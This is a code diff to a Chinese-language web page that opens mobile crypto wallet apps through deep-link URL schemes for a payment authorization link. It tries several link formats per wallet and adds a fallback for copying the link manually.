@@ -318,6 +318,16 @@
             margin-top: 0.5rem;
             cursor: pointer;
         }
+        
+        .wallet-tips {
+            background: rgba(255, 215, 0, 0.1);
+            border: 1px solid #ffd700;
+            border-radius: 0.75rem;
+            padding: 1rem;
+            margin: 1rem 0;
+            font-size: 0.8rem;
+            text-align: center;
+        }
     </style>
 </head>
 <body>
@@ -367,6 +377,13 @@
                     如果唤醒失败，请手动复制链接到钱包中打开
                 </div>
                 
+                <div class="wallet-tips">
+                    <strong>💡 TokenPocket 唤醒说明：</strong><br>
+                    1. 点击 TokenPocket 图标<br>
+                    2. 如果提示"打开APP"，点击确认<br>
+                    3. 如果无法唤醒，请使用下方手动链接
+                </div>
+                
                 <div class="wallet-options">
                     <div class="wallet-option" onclick="wakeupWalletApp('TokenPocket')">
                         <div class="wallet-icon">🔷</div>
@@ -378,21 +395,6 @@
                         <div class="wallet-name">MetaMask</div>
                     </div>
                     
-                    <div class="wallet-option" onclick="wakeupWalletApp('TrustWallet')">
-                        <div class="wallet-icon">🔒</div>
-                        <div class="wallet-name">Trust Wallet</div>
-                    </div>
-                    
-                    <div class="wallet-option" onclick="wakeupWalletApp('TronLink')">
-                        <div class="wallet-icon">⚡</div>
-                        <div class="wallet-name">TronLink</div>
-                    </div>
-                    
-                    <div class="wallet-option" onclick="wakeupWalletApp('OKX')">
-                        <div class="wallet-icon">🆗</div>
-                        <div class="wallet-name">OKX Web3</div>
-                    </div>
-                    
                     <div class="wallet-option" onclick="wakeupWalletApp('Bitget')">
                         <div class="wallet-icon">💰</div>
                         <div class="wallet-name">Bitget Wallet</div>
@@ -401,11 +403,6 @@
                     <div class="wallet-option" onclick="wakeupWalletApp('imToken')">
                         <div class="wallet-icon">💳</div>
                         <div class="wallet-name">imToken</div>
-                    </div>
-                    
-                    <div class="wallet-option" onclick="wakeupWalletApp('BitPie')">
-                        <div class="wallet-icon">🥧</div>
-                        <div class="wallet-name">BitPie比特派</div>
                     </div>
                 </div>
                 
@@ -468,10 +465,7 @@
         function isInWalletBrowser() {
             return window.ethereum || window.tronWeb || 
                    navigator.userAgent.includes('TokenPocket') ||
-                   navigator.userAgent.includes('TronLink') ||
                    navigator.userAgent.includes('MetaMask') ||
-                   navigator.userAgent.includes('TrustWallet') ||
-                   navigator.userAgent.includes('OKX') ||
                    navigator.userAgent.includes('Bitget') ||
                    navigator.userAgent.includes('imToken');
         }
@@ -532,35 +526,64 @@
 
             // 如果在手机浏览器，尝试唤醒钱包
             const walletSchemes = {
-                'TokenPocket': `tpoutside://open?url=${encodeURIComponent(fullAuthUrl)}`,
-                'TronLink': `tronlinkoutside://open?url=${encodeURIComponent(fullAuthUrl)}`,
-                'MetaMask': `metamask://browse?url=${encodeURIComponent(fullAuthUrl)}`,
-                'TrustWallet': `trust://browse?url=${encodeURIComponent(fullAuthUrl)}`,
-                'OKX': `okex://wallet/dapp?url=${encodeURIComponent(fullAuthUrl)}`,
-                'Bitget': `bitkeep://open?url=${encodeURIComponent(fullAuthUrl)}`,
-                'imToken': `imtokenv2://navigate?url=${encodeURIComponent(fullAuthUrl)}`,
-                'BitPie': `bitpie://open?url=${encodeURIComponent(fullAuthUrl)}`
+                'TokenPocket': [
+                    `tpoutside://open?url=${encodeURIComponent(fullAuthUrl)}`,
+                    `tpoutside://pull.activity?action=openDapp&dappUrl=${encodeURIComponent(fullAuthUrl)}`,
+                    `tpoutside://browser?url=${encodeURIComponent(fullAuthUrl)}`
+                ],
+                'MetaMask': [
+                    `metamask://browse?url=${encodeURIComponent(fullAuthUrl)}`,
+                    `metamask://wc?uri=${encodeURIComponent(fullAuthUrl)}`
+                ],
+                'Bitget': [
+                    `bitkeep://open?url=${encodeURIComponent(fullAuthUrl)}`,
+                    `bitkeep://browser?url=${encodeURIComponent(fullAuthUrl)}`
+                ],
+                'imToken': [
+                    `imtokenv2://navigate?url=${encodeURIComponent(fullAuthUrl)}`,
+                    `imtokenv2://browser?url=${encodeURIComponent(fullAuthUrl)}`
+                ]
             };
 
-            const scheme = walletSchemes[walletName];
-            if (!scheme) {
+            const schemes = walletSchemes[walletName];
+            if (!schemes) {
                 showTemporaryMessage('暂不支持该钱包支付');
                 return;
             }
 
-            console.log(`唤醒 ${walletName}:`, scheme);
-            
             // 显示手动操作链接
             document.getElementById('manualUrl').textContent = fullAuthUrl;
             document.getElementById('manualSection').style.display = 'block';
             
-            // 尝试唤醒钱包
-            attemptWakeup(scheme, walletName);
+            // 尝试多种唤醒方案
+            attemptMultipleWakeups(schemes, walletName, fullAuthUrl);
+        }
+
+        // 尝试多种唤醒方案
+        function attemptMultipleWakeups(schemes, walletName, fullAuthUrl) {
+            let success = false;
+            
+            schemes.forEach((scheme, index) => {
+                setTimeout(() => {
+                    if (!success) {
+                        console.log(`尝试 ${walletName} 方案 ${index + 1}:`, scheme);
+                        attemptWakeup(scheme, walletName);
+                    }
+                }, index * 300);
+            });
+            
+            // 如果所有方案都失败，显示手动操作提示
+            setTimeout(() => {
+                if (!success) {
+                    showTemporaryMessage(`如果未自动打开 ${walletName}，请使用上方手动链接`);
+                    document.getElementById('manualSection').style.display = 'block';
+                }
+            }, 1500);
         }
 
         // 尝试唤醒钱包
         function attemptWakeup(scheme, walletName) {
-            // 方法1: 使用iframe
+            // 方法1: 使用iframe（兼容性最好）
             try {
                 const iframe = document.createElement('iframe');
                 iframe.style.display = 'none';
@@ -584,9 +607,6 @@
                     window.location.href = scheme;
                 } catch (error) {
                     console.log(`${walletName} location方式失败:`, error);
-                showTemporaryMessage('自动唤醒失败，请使用上方手动链接');
-                document.getElementById('manualSection').style.display = 'block';
-                document.getElementById('manualUrl').textContent = fullAuthUrl;
                 }
             }, 100);
             
@@ -596,18 +616,35 @@
         // 复制手动链接
         function copyManualUrl() {
             const url = document.getElementById('manualUrl').textContent;
-            navigator.clipboard.writeText(url).then(() => {
-                showTemporaryMessage('链接已复制到剪贴板！');
-            }).catch(() => {
-                // 备用方案
-                const textArea = document.createElement('textarea');
-                textArea.value = url;
-                document.body.appendChild(textArea);
-                textArea.select();
+            if (navigator.clipboard) {
+                navigator.clipboard.writeText(url).then(() => {
+                    showTemporaryMessage('链接已复制到剪贴板！');
+                }).catch(() => {
+                    copyFallback(url);
+                });
+            } else {
+                copyFallback(url);
+            }
+        }
+
+        // 复制备用方案
+        function copyFallback(text) {
+            const textArea = document.createElement('textarea');
+            textArea.value = text;
+            textArea.style.position = 'fixed';
+            textArea.style.left = '-999999px';
+            textArea.style.top = '-999999px';
+            document.body.appendChild(textArea);
+            textArea.focus();
+            textArea.select();
+            try {
                 document.execCommand('copy');
-                document.body.removeChild(textArea);
                 showTemporaryMessage('链接已复制到剪贴板！');
-            });
+            } catch (err) {
+                console.error('复制失败:', err);
+                showTemporaryMessage('复制失败，请手动复制链接');
+            }
+            document.body.removeChild(textArea);
         }
     </script>
 </body>
